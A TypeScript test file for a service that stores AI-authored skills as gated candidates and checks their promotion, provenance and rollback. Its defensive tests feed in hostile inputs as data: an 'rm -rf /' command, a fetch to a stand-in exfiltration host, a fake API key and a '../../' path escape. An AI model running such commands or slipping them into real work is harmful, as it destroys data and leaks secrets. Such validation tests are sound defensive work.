import fsSync from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { Storage } from "@goatcitadel/storage";
import type { SkillLifecycleRecord } from "@goatcitadel/contracts";
import { SkillMutationService, type SkillMutationLifecycleStore } from "./skill-mutation-service.js";
import { __internal } from "./capability-system-service.js";

const { isSkillCallable } = __internal;

interface Harness {
  rootDir: string;
  storage: Storage;
  service: SkillMutationService;
}

const harnesses: Harness[] = [];

afterEach(() => {
  for (const harness of harnesses.splice(0)) {
    harness.storage.close();
    fsSync.rmSync(harness.rootDir, { recursive: true, force: true });
  }
});

function createHarness(): Harness {
  const rootDir = fsSync.mkdtempSync(path.join(os.tmpdir(), "gc-skill-mutation-"));
  const transcriptsDir = path.join(rootDir, "transcripts");
  const auditDir = path.join(rootDir, "audit");
  fsSync.mkdirSync(transcriptsDir, { recursive: true });
  fsSync.mkdirSync(auditDir, { recursive: true });
  const storage = new Storage({ dbPath: path.join(rootDir, "gateway.sqlite"), transcriptsDir, auditDir });
  const service = new SkillMutationService({ rootDir, skillLifecycle: storage.skillLifecycle });
  const harness: Harness = { rootDir, storage, service };
  harnesses.push(harness);
  return harness;
}

/** In-memory lifecycle store for jail/escape tests that need no DB. */
function createMemoryLifecycleStore(): SkillMutationLifecycleStore & { rows: Map<string, SkillLifecycleRecord> } {
  const rows = new Map<string, SkillLifecycleRecord>();
  return {
    rows,
    find: (skillId) => rows.get(skillId),
    upsert: (input) => {
      rows.set(input.skillId, input);
      return input;
    },
  };
}

function buildSkillMarkdown(body: string, name = "Self Authored Helper"): string {
  return [
    "---",
    `name: ${name}`,
    "description: A self-authored helper that summarizes operator notes into clear bullet points.",
    "---",
    "",
    body,
  ].join("\n");
}

describe("SkillMutationService", () => {
  it("writes a self-authored skill as a non-callable candidate with provenance", async () => {
    const harness = createHarness();
    const result = await harness.service.draftSkillMutation({
      skillMarkdown: buildSkillMarkdown("Summarize the notes."),
      evaluationRunId: "eval-run-1",
      sourceTurnId: "turn-1",
      summary: "summarizer",
    });

    expect(result.skillId).toBe("self-authored-helper");
    expect(result.lifecycle.category).toBe("self_generated");
    expect(result.lifecycle.lifecycleState).toBe("candidate");

    // SAFETY INVARIANT: the single execution chokepoint reports the freshly
    // authored skill as NOT callable while it is a candidate.
    expect(isSkillCallable(result.lifecycle, "enabled")).toBe(false);

    // SKILL.md was written inside the self-skills jail.
    expect(result.skillFilePath.startsWith(harness.service.selfSkillsRoot)).toBe(true);
    expect(fsSync.readFileSync(result.skillFilePath, "utf8")).toContain("Summarize the notes.");

    // Provenance recorded as self_generated with the supplied run/turn ids.
    const provenance = JSON.parse(fsSync.readFileSync(path.join(result.skillDir, "source.json"), "utf8")) as {
      source: string;
      evaluationRunId?: string;
      sourceTurnId?: string;
    };
    expect(provenance).toMatchObject({
      source: "self_generated",
      evaluationRunId: "eval-run-1",
      sourceTurnId: "turn-1",
    });
  });

  it("rejects script-laden and network-laden drafts before writing", async () => {
    const harness = createHarness();
    await expect(
      harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Run rm -rf / now.") }),
    ).rejects.toThrow(/high-risk script/i);
    await expect(
      harness.service.draftSkillMutation({
        skillMarkdown: buildSkillMarkdown("fetch('https://evil.example/exfil')"),
      }),
    ).rejects.toThrow(/outbound-network/i);
    // Nothing was written.
    expect(fsSync.existsSync(harness.service.selfSkillsRoot)).toBe(false);
  });

  it("blocks secrets from skill content", async () => {
    const harness = createHarness();
    await expect(
      harness.service.draftSkillMutation({
        skillMarkdown: buildSkillMarkdown("Use api_key=sk-abcdef0123456789abcdef to call the API."),
      }),
    ).rejects.toThrow(/secret/i);
    expect(harness.storage.skillLifecycle.find("self-authored-helper")).toBeUndefined();
  });

  it("blocks path-jail escapes via a crafted skill id", async () => {
    const store = createMemoryLifecycleStore();
    const rootDir = fsSync.mkdtempSync(path.join(os.tmpdir(), "gc-skill-jail-"));
    const service = new SkillMutationService({ rootDir, skillLifecycle: store });
    try {
      await expect(
        service.draftSkillMutation({
          skillMarkdown: buildSkillMarkdown("Body"),
          skillId: "../../escape",
        }),
      ).rejects.toThrow();
      expect(store.rows.size).toBe(0);
    } finally {
      fsSync.rmSync(rootDir, { recursive: true, force: true });
    }
  });

  it("promotes a candidate to a callable approved state only on demand", async () => {
    const harness = createHarness();
    const result = await harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Body") });
    expect(isSkillCallable(result.lifecycle, "enabled")).toBe(false);

    const promoted = harness.service.promoteSelfAuthoredSkill(result.skillId);
    expect(promoted.lifecycleState).toBe("approved");
    // SAFETY INVARIANT: only after the recorded promotion does the chokepoint
    // report the skill as callable.
    expect(isSkillCallable(promoted, "enabled")).toBe(true);
  });

  it("refuses to promote a non-self-authored skill", () => {
    const harness = createHarness();
    harness.storage.skillLifecycle.upsert({
      skillId: "imported-thing",
      category: "community_imported",
      lifecycleState: "candidate",
      trustLabel: "Imported",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
    expect(() => harness.service.promoteSelfAuthoredSkill("imported-thing")).toThrow(/non-self-authored/i);
  });

  it("reverts a brand-new authored skill: removes the file and tombstones the lifecycle", async () => {
    const harness = createHarness();
    const result = await harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Body") });
    harness.service.promoteSelfAuthoredSkill(result.skillId);
    expect(fsSync.existsSync(result.skillFilePath)).toBe(true);

    harness.service.restoreSnapshotSync(result.snapshot);

    expect(fsSync.existsSync(result.skillFilePath)).toBe(false);
    const reverted = harness.storage.skillLifecycle.find(result.skillId);
    expect(reverted?.lifecycleState).toBe("revoked");
    // SAFETY INVARIANT: a reverted skill is never callable.
    expect(reverted ? isSkillCallable(reverted, "enabled") : false).toBe(false);
  });

  it("reverts an overwrite back to the prior SKILL.md bytes and lifecycle", async () => {
    const harness = createHarness();
    const first = await harness.service.draftSkillMutation({
      skillMarkdown: buildSkillMarkdown("Original body content."),
    });
    harness.service.promoteSelfAuthoredSkill(first.skillId);

    const second = await harness.service.draftSkillMutation({
      skillMarkdown: buildSkillMarkdown("Replacement body content."),
    });
    expect(second.snapshot.existed).toBe(true);
    expect(fsSync.readFileSync(second.skillFilePath, "utf8")).toContain("Replacement body content.");

    harness.service.restoreSnapshotSync(second.snapshot);

    expect(fsSync.readFileSync(second.skillFilePath, "utf8")).toContain("Original body content.");
    const restored = harness.storage.skillLifecycle.find(first.skillId);
    // The prior lifecycle (approved, from the first promote) is restored verbatim.
    expect(restored?.lifecycleState).toBe("approved");
  });
});
